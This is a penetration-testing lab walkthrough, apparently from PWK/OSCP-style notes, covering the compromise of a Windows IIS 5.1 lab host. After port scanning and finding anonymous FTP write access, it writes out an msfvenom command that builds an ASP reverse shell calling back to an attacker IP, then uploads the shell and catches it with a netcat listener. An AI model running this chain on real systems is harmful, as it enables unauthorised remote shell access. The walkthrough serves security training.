Getting a Foothold

1. Enumerate the ports via NMAP scan. We ran a TCP Connect scan and saw that there is a Windows FTP service on port 21 and Windows web server at port 80.

2. Run NMAP scripts. Most interesting at this time is the FTP information and interesting directories at port 80

3. Run a non-recursive dirb scan. The /Scripts directory looks interesting

4. Login to FTP 21 as anonymous and verify the directories listed in the NMAP scan. We can put a .txt file into the default directory (the one we're dropped in after login), /Scripts, and /wwwroot and be able to view it from browser. 

5. Trial and error tells us that we cannot execute .exe files from the browser because it is access denied.

6. Google Search: `microsoft iis 5.1 language`
This shows us that it uses ASP language. Instead of the PHP shell we are used to, we can try an ASP shell

7. Enumerate for webdav using NMAP and davtest.
**davtest results are not reliable.** On this target, it specified that it failed to send an .asp, but was successful in sending .aspx. But a manual test shows that when we generate ASP shellcode, upload via FTP, then browse to the location, the ASP code is executed.

8. Generate the shellcode with msfvenom
After trial and error, we find that we need non-staged ASP shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.214 LPORT=445 -f asp > windows_shell_reverse_tcp_192.168.119.214_445.asp`
This shellcode is located on the attack machine (kali): `/home/kali/gitWorkspace/pwk/outputFiles/active_gathering/10.11.1.14/shellcodes/nonstaged/windows_shell_reverse_tcp_192.168.119.214_445.asp`

9. Upload the ASP shellcode file to the target via FTP. In this example, we renamed it to shell445.asp when using the PUT command **Remember to use BINARY mode before using PUT**

10. Open a netcat listener on the attack machine
`sudo nc -lvnp 445`

11. Now open a browser and access the shell
`http://10.11.1.14/Scripts/shell445.asp`

12. Check that the nc listener shows a shell
